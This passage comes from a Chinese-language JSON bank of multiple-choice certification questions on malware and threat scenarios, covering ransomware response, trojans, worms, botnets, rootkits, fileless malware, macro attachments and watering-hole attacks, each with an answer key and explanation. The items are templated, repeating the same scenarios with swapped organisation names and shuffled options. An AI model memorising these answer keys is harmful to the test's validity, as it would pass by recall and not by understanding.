      "B. 停用 Windows Update",
      "C. 開放所有巨集無需提醒",
      "D. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-360",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 惡意廣告攻擊（Malvertising）",
      "B. 中間人攻擊（MitM）",
      "C. 網路釣魚（Phishing）",
      "D. 社交工程（Social Engineering）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-361",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即點擊勒索信中的比特幣連結付款",
      "B. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離",
      "C. 立即重新啟動電腦嘗試修復",
      "D. 立即將備份硬碟插上受害電腦進行還原"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-362",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 邏輯炸彈（Logic Bomb）",
      "B. 網站漏洞（SQL Injection）",
      "C. 電腦蠕蟲（Worm）",
      "D. 特洛伊木馬（Trojan Horse）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-363",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國立頂尖研究型大學內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力",
      "B. 巨集病毒必須由使用者手動開啟檔案",
      "C. 跨網站腳本必須由瀏覽器觸發",
      "D. 勒索軟體必須由黑客人工手動逐台輸入密碼"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-364",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某跨國金融控股銀行監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 蜜罐（Honeypot）",
      "B. 負載平衡器（Load Balancer）",
      "C. 殭屍節點（Botnet / Bots）",
      "D. 代理伺服器（Proxy）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-365",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. 鍵盤側錄器（Keylogger）",
      "B. Rootkit（管理者工具包 / 隱匿工具）",
      "C. 勒索軟體（Ransomware）",
      "D. 廣告軟體（Adware）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-366",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 無檔案惡意程式（Fileless Malware）",
      "B. 傳統開機區引導病毒",
      "C. 網路釣魚攻擊",
      "D. 磁碟壞軌故障"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-367",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某知名大型網路電商平台人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 立即點擊啟用巨集以確認真實姓名",
      "B. 忽略警告直接填寫個人資料",
      "C. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕",
      "D. 將檔案轉寄給全公司同仁幫忙確認"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-368",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 阻斷服務攻擊（DDoS）",
      "B. 實體尾隨入侵",
      "C. 字典檔暴力破解攻擊",
      "D. 水坑攻擊（Watering Hole Attack）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-369",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 開放所有巨集無需提醒",
      "B. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）",
      "C. 停用 Windows Update",
      "D. 僅要求同仁自行辨識信箱來源"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-370",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某知名大型網路電商平台資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 網路釣魚（Phishing）",
      "B. 中間人攻擊（MitM）",
      "C. 社交工程（Social Engineering）",
      "D. 惡意廣告攻擊（Malvertising）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-371",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某知名大型網路電商平台多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即將備份硬碟插上受害電腦進行還原",
      "B. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離",
      "C. 立即點擊勒索信中的比特幣連結付款",
      "D. 立即重新啟動電腦嘗試修復"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-372",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某公務機關資訊處一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 邏輯炸彈（Logic Bomb）",
      "B. 電腦蠕蟲（Worm）",
      "C. 網站漏洞（SQL Injection）",
      "D. 特洛伊木馬（Trojan Horse）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-373",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某金流與行動支付科技公司內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力",
      "B. 巨集病毒必須由使用者手動開啟檔案",
      "C. 跨網站腳本必須由瀏覽器觸發",
      "D. 勒索軟體必須由黑客人工手動逐台輸入密碼"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-374",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某公務機關資訊處監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 代理伺服器（Proxy）",
      "B. 蜜罐（Honeypot）",
      "C. 殭屍節點（Botnet / Bots）",
      "D. 負載平衡器（Load Balancer）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-375",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某跨國金融控股銀行資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. Rootkit（管理者工具包 / 隱匿工具）",
      "B. 勒索軟體（Ransomware）",
      "C. 鍵盤側錄器（Keylogger）",
      "D. 廣告軟體（Adware）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-376",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 磁碟壞軌故障",
      "B. 網路釣魚攻擊",
      "C. 傳統開機區引導病毒",
      "D. 無檔案惡意程式（Fileless Malware）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-377",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 將檔案轉寄給全公司同仁幫忙確認",
      "B. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕",
      "C. 立即點擊啟用巨集以確認真實姓名",
      "D. 忽略警告直接填寫個人資料"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-378",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某高科技晶圓代工大廠資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 實體尾隨入侵",
      "B. 水坑攻擊（Watering Hole Attack）",
      "C. 阻斷服務攻擊（DDoS）",
      "D. 字典檔暴力破解攻擊"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-379",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某公務機關資訊處為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 停用 Windows Update",
      "B. 開放所有巨集無需提醒",
      "C. 僅要求同仁自行辨識信箱來源",
      "D. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-380",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 網路釣魚（Phishing）",
      "B. 社交工程（Social Engineering）",
      "C. 中間人攻擊（MitM）",
      "D. 惡意廣告攻擊（Malvertising）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-381",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即重新啟動電腦嘗試修復",
      "B. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離",
      "C. 立即點擊勒索信中的比特幣連結付款",
      "D. 立即將備份硬碟插上受害電腦進行還原"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-382",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某高科技晶圓代工大廠一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 邏輯炸彈（Logic Bomb）",
      "B. 電腦蠕蟲（Worm）",
      "C. 特洛伊木馬（Trojan Horse）",
      "D. 網站漏洞（SQL Injection）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-383",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 巨集病毒必須由使用者手動開啟檔案",
      "B. 勒索軟體必須由黑客人工手動逐台輸入密碼",
      "C. 跨網站腳本必須由瀏覽器觸發",
      "D. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-384",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某高科技晶圓代工大廠監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 殭屍節點（Botnet / Bots）",
      "B. 代理伺服器（Proxy）",
      "C. 負載平衡器（Load Balancer）",
      "D. 蜜罐（Honeypot）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-385",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. Rootkit（管理者工具包 / 隱匿工具）",
      "B. 勒索軟體（Ransomware）",
      "C. 廣告軟體（Adware）",
      "D. 鍵盤側錄器（Keylogger）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-386",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 無檔案惡意程式（Fileless Malware）",
      "B. 磁碟壞軌故障",
      "C. 傳統開機區引導病毒",
      "D. 網路釣魚攻擊"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-387",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某公務機關資訊處人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 忽略警告直接填寫個人資料",
      "B. 立即點擊啟用巨集以確認真實姓名",
      "C. 將檔案轉寄給全公司同仁幫忙確認",
      "D. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-388",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
